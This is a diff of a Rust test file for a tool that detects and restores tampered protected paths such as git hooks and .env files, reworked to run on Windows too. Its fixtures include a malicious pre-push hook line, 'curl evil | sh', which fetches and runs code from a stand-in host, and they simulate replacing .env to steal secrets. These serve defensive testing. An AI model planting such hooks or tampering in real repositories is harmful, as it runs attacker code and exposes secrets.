@@ -142,10 +142,12 @@ fn a_linked_worktree_watches_the_common_git_directory() {
 fn restore_puts_protected_paths_back_exactly_and_verifies_them() {
     let (root, policy) = tree();
     let p = root.path();
+    // A protected hook exists on every platform; the executable bit is a
+    // Unix-only attribute (on Windows executability is name-based).
+    std::fs::write(p.join(".git/hooks/pre-push"), "#!/bin/sh\nexit 0\n").unwrap();
     #[cfg(unix)]
     {
         use std::os::unix::fs::PermissionsExt;
-        std::fs::write(p.join(".git/hooks/pre-push"), "#!/bin/sh\nexit 0\n").unwrap();
         std::fs::set_permissions(
             p.join(".git/hooks/pre-push"),
             std::fs::Permissions::from_mode(0o755),
@@ -157,7 +159,6 @@ fn restore_puts_protected_paths_back_exactly_and_verifies_them() {
     std::fs::remove_file(p.join(".github/workflows/ci.yml")).unwrap();
     std::fs::write(p.join(".env.production"), "KEY=1\n").unwrap();
     std::fs::write(p.join("src/main.rs"), "fn main() { 2 }\n").unwrap();
-    #[cfg(unix)]
     std::fs::write(p.join(".git/hooks/pre-push"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
     let after = capture(&policy, Limits::default());
     let d = diff(&before, &after, &policy);
@@ -174,13 +175,13 @@ fn restore_puts_protected_paths_back_exactly_and_verifies_them() {
         "name: ci\n"
     );
     assert!(!p.join(".env.production").exists());
+    assert_eq!(
+        std::fs::read_to_string(p.join(".git/hooks/pre-push")).unwrap(),
+        "#!/bin/sh\nexit 0\n"
+    );
     #[cfg(unix)]
     {
         use std::os::unix::fs::PermissionsExt;
-        assert_eq!(
-            std::fs::read_to_string(p.join(".git/hooks/pre-push")).unwrap(),
-            "#!/bin/sh\nexit 0\n"
-        );
         assert_eq!(
             std::fs::metadata(p.join(".git/hooks/pre-push"))
                 .unwrap()
@@ -204,7 +205,21 @@ fn restore_puts_protected_paths_back_exactly_and_verifies_them() {
     );
 }
 
-#[cfg(unix)]
+/// A symbolic link on any platform: Windows needs to know a file link from a
+/// directory link, and creating either needs Developer Mode (or elevation),
+/// which this project's machines and CI runners have; without it the unwrap
+/// fails loudly rather than skipping (PX-030).
+fn link(target: &std::path::Path, at: &std::path::Path) {
+    #[cfg(unix)]
+    std::os::unix::fs::symlink(target, at).unwrap();
+    #[cfg(windows)]
+    if target.is_dir() {
+        std::os::windows::fs::symlink_dir(target, at).unwrap();
+    } else {
+        std::os::windows::fs::symlink_file(target, at).unwrap();
+    }
+}
+
 #[test]
 fn a_protected_symlink_swap_is_detected_and_a_file_too_large_to_retain_is_named() {
     let (root, policy) = tree();
@@ -220,8 +235,10 @@ fn a_protected_symlink_swap_is_detected_and_a_file_too_large_to_retain_is_named(
     let before = capture(&policy2, limits);
     std::fs::write(p.join("id_rsa.big"), vec![b'z'; 4096]).unwrap();
     // `.env` replaced by a link to outside the tree
+    let outside = tempfile::tempdir().unwrap();
+    std::fs::write(outside.path().join("outside.txt"), "OUTSIDE\n").unwrap();
     std::fs::remove_file(p.join(".env")).unwrap();
-    std::os::unix::fs::symlink("/etc/hosts", p.join(".env")).unwrap();
+    link(&outside.path().join("outside.txt"), &p.join(".env"));
     let after = capture(&policy2, limits);
     let d = diff(&before, &after, &policy2);
     let protected: Vec<_> = d.iter().filter(|x| x.protected_by.is_some()).collect();
@@ -241,6 +258,39 @@ fn a_protected_symlink_swap_is_detected_and_a_file_too_large_to_retain_is_named(
         "SECRET=1\n"
     );
     let _ = policy;
+}
+
+#[test]
+fn a_destroyed_protected_symlink_is_restored_as_the_same_link() {
+    let (root, policy) = tree();
+    let p = root.path();
+    // `.env` starts as a link to a real file outside the tree's control.
+    let target_dir = tempfile::tempdir().unwrap();
+    std::fs::write(target_dir.path().join("real.txt"), "REAL-CONTENT\n").unwrap();
+    std::fs::remove_file(p.join(".env")).unwrap();
+    link(&target_dir.path().join("real.txt"), &p.join(".env"));
+    let before = capture(&policy, Limits::default());
+    // a hostile process replaces the link with a plain file
+    std::fs::remove_file(p.join(".env")).unwrap();
+    std::fs::write(p.join(".env"), "SECRET=stolen\n").unwrap();
+    let after = capture(&policy, Limits::default());
+    let d = diff(&before, &after, &policy);
+    let protected: Vec<_> = d.iter().filter(|x| x.protected_by.is_some()).collect();
+    assert_eq!(protected.len(), 1, "{d:?}");
+    let r = restore(&before, &protected);
+    assert_eq!(r.restored, [".env"], "{r:?}");
+    // restored as the same link, not as a plain copy
+    assert!(
+        std::fs::symlink_metadata(p.join(".env"))
+            .unwrap()
+            .is_symlink(),
+        "the protected path is a symbolic link again"
+    );
+    assert!(
+        std::fs::read_to_string(p.join(".env"))
+            .unwrap()
+            .contains("REAL-CONTENT")
+    );
 }
 
 #[test]
